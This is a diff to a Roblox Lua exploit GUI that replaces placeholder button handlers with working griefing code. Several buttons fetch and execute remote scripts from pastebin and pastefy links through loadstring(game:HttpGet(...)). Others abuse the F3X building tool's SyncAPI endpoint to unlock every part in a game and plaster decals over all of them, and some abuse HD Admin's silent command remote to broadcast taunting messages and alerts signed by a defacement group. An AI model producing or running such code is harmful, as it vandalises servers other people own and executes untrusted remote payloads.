@@ -1052,7 +1052,7 @@ TextButton16.Font = Enum.Font.Code
 TextButton16.TextXAlignment = Enum.TextXAlignment.Center
 TextButton16.TextYAlignment = Enum.TextYAlignment.Center
 TextButton16.MouseButton1Click:Connect(function()
-    print('TextButton16 clicked')
+    loadstring(game:HttpGet("https://pastebin.com/raw/0KqHZ8D9"))()
 end)
 
 local TextButton7 = Instance.new('TextButton')
@@ -1172,7 +1172,7 @@ TextButton2_21.MouseButton1Click:Connect(function()
 		end
 	end
 
-	spam("107718665619260")
+	spam("98964423944040")--w2sLog
 end)
 
 local TextButton16_1 = Instance.new('TextButton')
@@ -2293,7 +2293,7 @@ TextButton16_8.BackgroundColor3 = Color3.fromRGB(255,255,255)
 TextButton16_8.BackgroundTransparency = 0
 TextButton16_8.BorderSizePixel = 1
 TextButton16_8.BorderColor3 = Color3.fromRGB(27,42,53)
-TextButton16_8.Text = [[Please All]]
+TextButton16_8.Text = [[Plazze All]]
 TextButton16_8.TextColor3 = Color3.fromRGB(0,0,0)
 TextButton16_8.TextTransparency = 0
 TextButton16_8.TextSize = 8
@@ -2329,7 +2329,10 @@ TextButton16_9.Font = Enum.Font.Code
 TextButton16_9.TextXAlignment = Enum.TextXAlignment.Center
 TextButton16_9.TextYAlignment = Enum.TextYAlignment.Center
 TextButton16_9.MouseButton1Click:Connect(function()
-    print('TextButton16_9 clicked')
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+RequestCommand:InvokeServer(";m T*am White2spooky on t*p!")
 end)
 
 local TextButton16_10 = Instance.new('TextButton')
@@ -2352,7 +2355,7 @@ TextButton16_10.Font = Enum.Font.Code
 TextButton16_10.TextXAlignment = Enum.TextXAlignment.Center
 TextButton16_10.TextYAlignment = Enum.TextYAlignment.Center
 TextButton16_10.MouseButton1Click:Connect(function()
-    print('TextButton16_10 clicked')
+    loadstring(game:HttpGet("https://pastefy.app/SUyMLMC5/raw"))()
 end)
 
 local TextButton16_11 = Instance.new('TextButton')
@@ -2375,7 +2378,10 @@ TextButton16_11.Font = Enum.Font.Code
 TextButton16_11.TextXAlignment = Enum.TextXAlignment.Center
 TextButton16_11.TextYAlignment = Enum.TextYAlignment.Center
 TextButton16_11.MouseButton1Click:Connect(function()
-    print('TextButton16_11 clicked')
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+RequestCommand:InvokeServer(";m Seve Got Fricked by White2spookskidd!")
 end)
 
 local TextButton16_12 = Instance.new('TextButton')
@@ -2388,7 +2394,7 @@ TextButton16_12.BackgroundColor3 = Color3.fromRGB(255,255,255)
 TextButton16_12.BackgroundTransparency = 0
 TextButton16_12.BorderSizePixel = 1
 TextButton16_12.BorderColor3 = Color3.fromRGB(27,42,53)
-TextButton16_12.Text = [[Team All]]
+TextButton16_12.Text = [[Alert]]
 TextButton16_12.TextColor3 = Color3.fromRGB(0,0,0)
 TextButton16_12.TextTransparency = 0
 TextButton16_12.TextSize = 8
@@ -2398,7 +2404,10 @@ TextButton16_12.Font = Enum.Font.Code
 TextButton16_12.TextXAlignment = Enum.TextXAlignment.Center
 TextButton16_12.TextYAlignment = Enum.TextYAlignment.Center
 TextButton16_12.MouseButton1Click:Connect(function()
-    print('TextButton16_12 clicked')
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+RequestCommand:InvokeServer(";alert T*am White2spookyia Wuz Here Kiddo!")
 end)
 
 local TextButton3_1 = Instance.new('TextButton')
@@ -2421,7 +2430,78 @@ TextButton3_1.Font = Enum.Font.Code
 TextButton3_1.TextXAlignment = Enum.TextXAlignment.Center
 TextButton3_1.TextYAlignment = Enum.TextYAlignment.Center
 TextButton3_1.MouseButton1Click:Connect(function()
-    print('TextButton3_1 clicked')
+    local player = game.Players.LocalPlayer
+	local char = player.Character or player.CharacterAdded:Wait()
+	local tool
+
+	for _, v in ipairs(player:GetDescendants()) do
+		if v.Name == "SyncAPI" then
+			tool = v.Parent
+			break
+		end
+	end
+
+	if not tool then
+		for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	end
+
+	if not tool then return end
+
+	local remote = tool.SyncAPI.ServerEndpoint
+
+	local function _(args)
+		remote:InvokeServer(unpack(args))
+	end
+
+	local function SetLocked(part, boolean)
+		_({"SetLocked", {part}, boolean})
+	end
+
+	local function SpawnDecal(part, side)
+		_({"CreateTextures", {{
+			Part = part,
+			Face = side,
+			TextureType = "Decal"
+		}}})
+	end
+
+	local function AddDecal(part, asset, side)
+		_({"SyncTexture", {{
+			Part = part,
+			Face = side,
+			TextureType = "Decal",
+			Texture = "rbxassetid://" .. asset
+		}}})
+	end
+
+	local function spam(id)
+		for _, v in ipairs(workspace:GetDescendants()) do
+			if v:IsA("BasePart") then
+				task.spawn(function()
+					SetLocked(v, false)
+
+					for _, face in ipairs({
+						Enum.NormalId.Front,
+						Enum.NormalId.Back,
+						Enum.NormalId.Right,
+						Enum.NormalId.Left,
+						Enum.NormalId.Top,
+						Enum.NormalId.Bottom
+					}) do
+						SpawnDecal(v, face)
+						AddDecal(v, id, face)
+					end
+				end)
+			end
+		end
+	end
+
+	spam("106228398533086")--w2sJumps
 end)
 
 local TextButton16_13 = Instance.new('TextButton')
@@ -2444,7 +2524,7 @@ TextButton16_13.Font = Enum.Font.Code
 TextButton16_13.TextXAlignment = Enum.TextXAlignment.Center
 TextButton16_13.TextYAlignment = Enum.TextYAlignment.Center
 TextButton16_13.MouseButton1Click:Connect(function()
-    print('TextButton16_13 clicked')
+    print('soon')
 end)
 
 local TextButton12 = Instance.new('TextButton')
@@ -2467,7 +2547,10 @@ TextButton12.Font = Enum.Font.Code
 TextButton12.TextXAlignment = Enum.TextXAlignment.Center
 TextButton12.TextYAlignment = Enum.TextYAlignment.Center
 TextButton12.MouseButton1Click:Connect(function()
-    print('TextButton12 clicked')
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+RequestCommand:InvokeServer(";time 0")
 end)
 
 local TextButton16_14 = Instance.new('TextButton')
@@ -2490,7 +2573,7 @@ TextButton16_14.Font = Enum.Font.Code
 TextButton16_14.TextXAlignment = Enum.TextXAlignment.Center
 TextButton16_14.TextYAlignment = Enum.TextYAlignment.Center
 TextButton16_14.MouseButton1Click:Connect(function()
-    print('TextButton16_14 clicked')
+    loadstring(game:HttpGet("https://pastebin.com/raw/3EV59jLS"))()
 end)
 
 local TextButton_1 = Instance.new('TextButton')
@@ -2513,7 +2596,78 @@ TextButton_1.Font = Enum.Font.Code
 TextButton_1.TextXAlignment = Enum.TextXAlignment.Center
 TextButton_1.TextYAlignment = Enum.TextYAlignment.Center
 TextButton_1.MouseButton1Click:Connect(function()
-    print('TextButton_1 clicked')
+    local player = game.Players.LocalPlayer
+	local char = player.Character or player.CharacterAdded:Wait()
+	local tool
+
+	for _, v in ipairs(player:GetDescendants()) do
+		if v.Name == "SyncAPI" then
+			tool = v.Parent
+			break
+		end
+	end
+
+	if not tool then
+		for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	end
+
+	if not tool then return end
+
+	local remote = tool.SyncAPI.ServerEndpoint
+
+	local function _(args)
+		remote:InvokeServer(unpack(args))
+	end
+
+	local function SetLocked(part, boolean)
+		_({"SetLocked", {part}, boolean})
+	end
+
+	local function SpawnDecal(part, side)
+		_({"CreateTextures", {{
+			Part = part,
+			Face = side,
+			TextureType = "Decal"
+		}}})
+	end
+
+	local function AddDecal(part, asset, side)
+		_({"SyncTexture", {{
+			Part = part,
+			Face = side,
+			TextureType = "Decal",
+			Texture = "rbxassetid://" .. asset
+		}}})
+	end
+
+	local function spam(id)
+		for _, v in ipairs(workspace:GetDescendants()) do
+			if v:IsA("BasePart") then
+				task.spawn(function()
+					SetLocked(v, false)
+
+					for _, face in ipairs({
+						Enum.NormalId.Front,
+						Enum.NormalId.Back,
+						Enum.NormalId.Right,
+						Enum.NormalId.Left,
+						Enum.NormalId.Top,
+						Enum.NormalId.Bottom
+					}) do
+						SpawnDecal(v, face)
+						AddDecal(v, id, face)
+					end
+				end)
+			end
+		end
+	end
+
+	spam("103090501277573")--w2s
 end)
 
 local TextButton16_15 = Instance.new('TextButton')
